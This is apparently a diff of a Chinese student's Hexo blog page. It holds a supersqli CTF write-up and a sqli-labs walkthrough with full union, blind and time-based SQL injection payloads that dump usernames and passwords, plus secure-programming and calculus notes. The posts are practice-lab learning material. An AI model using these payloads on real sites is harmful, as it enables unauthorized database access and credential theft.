return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/02/28/ctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="cotton-star">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/02/28/ctf/" class="post-title-link" itemprop="url">ctf</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-02-28 21:00:33 / Modified: 21:11:49" itemprop="dateCreated datePublished" datetime="2024-02-28T21:00:33+08:00">2024-02-28</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="1-supersqli-攻防世界"><a href="#1-supersqli-攻防世界" class="headerlink" title="1.supersqli(攻防世界)"></a>1.supersqli(攻防世界)</h3><pre><code>先正常尝试
-发现1&#39;#存在sql漏洞
-然后通过1&#39;order by 2#发现只有两列
-之后使用1&#39;union select 1,2发现select被禁
-搜索发现试试使用堆叠注入和show方法
-第一步：1&#39;; show databases; # 
-成功发现数据库supersqli
-第二步：1&#39;;use supersqli;show tables;#
-发现俩表
-第三步：1&#39;;use supersqli;show columns from `1919810931114514`;# 
-打开表看看，发现flag
-
-过滤中并没有alert 和 rename，我们已经知道了words是用来回显内容的，我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容。
-1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
-
-1&#39; or 1=1#
-得到flag
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/02/24/web/sql%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="cotton-star">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/02/24/web/sql%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">sql学习</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-02-24 21:35:49" itemprop="dateCreated datePublished" datetime="2024-02-24T21:35:49+08:00">2024-02-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-02-27 15:01:53" itemprop="dateModified" datetime="2024-02-27T15:01:53+08:00">2024-02-27</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h1><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>SELECT *<br>FROM ‘user’<br>WHERE username IS admin<br>LIMIT 0,2<br>&#x2F;&#x2F;从user的所有中查<br>&#x2F;&#x2F;查username是admin的<br>&#x2F;&#x2F;跨过0行查两行</p>
-<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>INSERT INTO ‘user’ (username, ‘password’, isAdmin)<br> VALUES(‘张三’, ‘1111’, 0)<br> &#x2F;&#x2F;向user中的username,password,isAdmin中插入下面三个值</p>
-<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>UPDATE ‘user’<br>  SET isAdmin &#x3D; 0<br>  WHERE id &#x3D; 1</p>
-<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>DELETE FROM ‘user’<br>  WHERE id &#x3D; 16</p>
-<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><ol>
-<li>输入?id&#x3D;1，?id&#x3D;2判断在数据库中查询</li>
-<li>之后输入 ?id&#x3D;1’，?id&#x3D;1’ –+判断sql语句是否拼接，是数字型还是字符型</li>
-<li>输入?id&#x3D;1’order by 3 –+发现页面正常<br>输入?id&#x3D;1’order by 4 –+页面出错说明表只有三列</li>
-<li>输入?id&#x3D;-1’union select 1,2,3–+爆出显示位,发现第二列和第三列显示</li>
-<li>输入?id&#x3D;-1’union select 1,database(),version()–+,发现当前数据名和版本号</li>
-<li>利用获取的security,输入?id&#x3D;-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+得知数据库有四个表，账号密码可能在users表中</li>
-<li>输入?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+爆字段名，发现username和password</li>
-<li>最后输入?id&#x3D;-1’union select 1,2,group_concat(username,password,id) from users–+得到密码</li>
-</ol>
-<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><ol>
-<li>输入?id&#x3D;1’时报错并且没出现数字发现是数字型剩余步骤除了没有’ –+意外都和第一关一致</li>
-</ol>
-<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><ol>
-<li>输入?id&#x3D;2’时报错可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号。<br>即?id&#x3D;2’) –+<br>之后步骤在括号和–+之中进行，与第一关一致</li>
-</ol>
-<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>双引号括号</p>
-<h2 id="小结：首先判断闭合符号，闭合符号有4种（’、”、’-、”-之后公式走"><a href="#小结：首先判断闭合符号，闭合符号有4种（’、”、’-、”-之后公式走" class="headerlink" title="小结：首先判断闭合符号，闭合符号有4种（’、”、’)、”))之后公式走"></a>小结：首先判断闭合符号，闭合符号有4种（’、”、’)、”))之后公式走</h2><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>因为没有数据库信息进行回显，因此我们采取盲注，思路差不多</p>
-<ol>
-<li>判断闭合符号,发现是’ –+</li>
-<li>输入?id&#x3D;1’ and length((select database()))&#x3D;* –+  判断数据库长度(数字一个一个试或写脚本)</li>
-<li>输入?id&#x3D;1’ and substr((select database),1,1)&#x3D;* –+  得出数据库具体名称(substr((在哪里),第几个,取几个))</li>
-<li>输入?id&#x3D;1’ and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;* –+ 得出表名字符长度</li>
-<li>输入?id&#x3D;1’ and substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;* –+ 得出所有表名</li>
-<li>输入?id&#x3D;1’ and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&#x3D;* –+ 得出字段名长度</li>
-<li>输入?id&#x3D;1’ and substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1)&#x3D;* –+ 得出所有字段名</li>
-<li>输入?id&#x3D;1’ and substr((select group_concat(username,password) from users),1,1)&#x3D;* –+ 得出所有内容</li>
-</ol>
-<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>只需将第五关的单引号换成双引号，其余一致</p>
-<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>id&#x3D;1’))–+</p>
-<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>与第五关一致</p>
-<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>界面显示一致，利用时间注入</p>
-<ol>
-<li>输入?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’ and if(length((select database()))&#x3D;8,sleep(5),1)–+ 如果长度&#x3D;8为真则页面延迟10s</li>
-<li>输入?id&#x3D;1’ and if(ascii(substr(select database())1,1))&#x3D;115,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’ and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;* ,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’ and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&#x3D;* ,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+</li>
-<li>输入?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+</li>
-</ol>
-<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>将单引号换成双引号。</p>
-<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>post型<br>在用户名处判断闭合符号，然后使用联合注入<br>注意只有两列，因此union select 1,group_concat()即可</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/01/10/%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E6%A6%82%E5%BF%B5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="cotton-star">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/01/10/%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E6%A6%82%E5%BF%B5/" class="post-title-link" itemprop="url">安全编程概念</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-01-10 15:10:54 / Modified: 18:37:59" itemprop="dateCreated datePublished" datetime="2024-01-10T15:10:54+08:00">2024-01-10</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="1-什么是安全漏洞"><a href="#1-什么是安全漏洞" class="headerlink" title="1.什么是安全漏洞"></a>1.什么是安全漏洞</h1><p>漏洞是指计算机系统在硬件，软件，协议的具体实现和系统安全策略存在的缺陷和不足，使得攻击者可以在未授权的情况下访问或破坏系统<br>计算机系统安全包括开发和配置两个方面<br>安全漏洞的危害：</p>
-<ol>
-<li>对系统的威胁</li>
-<li>非法获取访问权限</li>
-<li>权限提升</li>
-<li>拒绝访问</li>
-<li>恶意软件植入</li>
-<li>数据丢失或泄露</li>
-</ol>
-<h1 id="2-什么是安全编程"><a href="#2-什么是安全编程" class="headerlink" title="2.什么是安全编程"></a>2.什么是安全编程</h1><p>安全编程是指在编写程序的过程中，为了保证程序的安全性和可靠性，采取的一系列措施和技术手段用来预防和应对潜在的安全风险和威胁，它是一种以安全为目的的编写方法，旨在减少程序漏洞，防止被攻击和利用。</p>
-<ol>
-<li>安全编程的核心目标是保护系统的机密性完整性可用性</li>
-<li>安全编程是以一系列技术手段来保障系统的安全性</li>
-<li>安全编程需要遵循一定的编程规范和最佳实践</li>
-</ol>
-<h1 id="3-整数安全漏洞"><a href="#3-整数安全漏洞" class="headerlink" title="3.整数安全漏洞"></a>3.整数安全漏洞</h1><p>整数安全漏洞是指对整数操作时产生了超过该类型所能表示的范围的数值，引起数据失真，通常有三种情形：回绕，溢出，截断</p>
-<ol>
-<li>回绕是指整数表示范围的上界和下界形成闭环</li>
-<li>溢出是指有符号整形超出该类型所能表示范围</li>
-<li>截断是指将宽度较大的整数存入宽度较小的操作数时，高位数据被丢弃</li>
-</ol>
-<h1 id="4-避免整数安全漏洞"><a href="#4-避免整数安全漏洞" class="headerlink" title="4.避免整数安全漏洞"></a>4.避免整数安全漏洞</h1><ol>
-<li>改变运算手段</li>
-<li>使用较大范围类型表示操作数</li>
-<li>使用测试手段保证安全运算</li>
-</ol>
-<h1 id="5-缓冲区溢出漏洞"><a href="#5-缓冲区溢出漏洞" class="headerlink" title="5.缓冲区溢出漏洞"></a>5.缓冲区溢出漏洞</h1><p>缓冲区是用来存放程序运行时所产生的临时数据，其内存地址连续且大小有限，根据分配方式和使用目的，可分为栈缓冲区和堆缓冲区，栈缓冲区存放的是临时变量和函数参数，堆缓冲区存放的是动态开辟释放的内存。<br>程序在处理数据时，若未能对数据大小或字符串长度进行适当的限制在进行赋值复制填充时没有对数据限定边界，导致数据长度大小超过了缓冲区的大小，就会导致内存中一些关键数据被覆盖，或者说当向某特定数据分配的内存区域以外写入数据时，就会发生缓冲区溢出</p>
-<h1 id="6-栈缓冲区溢出原理"><a href="#6-栈缓冲区溢出原理" class="headerlink" title="6.栈缓冲区溢出原理"></a>6.栈缓冲区溢出原理</h1><p>栈是一种先进后出或后进先出的数据结构，有入栈，出栈，栈顶，栈底，ESP，EBP等内容<br>c语言是函数式语言，在编译运行时，为每个函数调用分配了一个栈帧，每个栈帧都是独立的栈结构，通常把所有函数调用栈帧的集合称为系统栈<br>栈帧的生长方向是由高地址向低地址，而局部数组的生长方向是由低地址向高地址，由于栈帧的空间有限，如果将数据复制到局部数组缓冲区中就有可能超出缓冲区区域，导致高地址数据被覆盖。</p>
-<ol>
-<li>覆盖了其他局部变量</li>
-<li>覆盖了上一栈帧的EBP值，导致栈帧失去平衡</li>
-<li>覆盖了返回地址，导致代码执行意外的流程</li>
-<li>覆盖了参数变量，影响当前函数结果</li>
-<li>覆盖了上一函数的栈帧，影响上一函数流程</li>
-</ol>
-<h1 id="7-缓冲区溢出的利用"><a href="#7-缓冲区溢出的利用" class="headerlink" title="7.缓冲区溢出的利用"></a>7.缓冲区溢出的利用</h1><p>缓冲区溢出会使程序崩溃，但要执行任意代码，还需完成一下两点</p>
-<ol>
-<li>在程序的地址空间安排适当的代码，达到目的<ol>
-<li>植入法</li>
-<li>利用已存在的代码</li>
-</ol>
-</li>
-<li>控制程序跳转到第一步所安排的代码<ol>
-<li>覆盖返回地址</li>
-<li>覆盖对象指针或函数</li>
-<li>覆盖SHE链表</li>
-</ol>
-</li>
-</ol>
-<h1 id="8-栈溢出的防范"><a href="#8-栈溢出的防范" class="headerlink" title="8.栈溢出的防范"></a>8.栈溢出的防范</h1><ol>
-<li>编程时注意缓冲区的边界</li>
-<li>不使用strcpy,memcpy等不安全的函数</li>
-<li>在编译器中加入边界检查</li>
-<li>在使用栈中重要数据之前加入检查，如Security Cookie技术</li>
-</ol>
-<h1 id="9-数据安全问题的防范"><a href="#9-数据安全问题的防范" class="headerlink" title="9.数据安全问题的防范"></a>9.数据安全问题的防范</h1><ol>
-<li>指定和检查数组元素下标的上下边界</li>
-<li>使用安全函数</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/01/06/%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%B9%A0/%E6%95%B0%E5%AD%A6%E5%88%B7%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="cotton-star">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/01/06/%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%B9%A0/%E6%95%B0%E5%AD%A6%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">高数刷题笔记</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-01-06 16:55:17 / Modified: 16:57:54" itemprop="dateCreated datePublished" datetime="2024-01-06T16:55:17+08:00">2024-01-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>只是记录遇到的知识点</p>
-<h1 id="连续点"><a href="#连续点" class="headerlink" title="连续点"></a>连续点</h1><p>：在x0处极限值等于其函数值为连续点；</p>
-<h1 id="渐近线"><a href="#渐近线" class="headerlink" title="渐近线"></a>渐近线</h1><p>：当limx-&gt;x0 f(x)&#x3D;∞  有铅直渐近线<br>：当limx-&gt;∞ f(x)&#x3D;c   有水平渐近线</p>
-<h1 id="可导"><a href="#可导" class="headerlink" title="可导"></a>可导</h1><p>左右导数存在且相等为可导</p>
 
       
     </div>
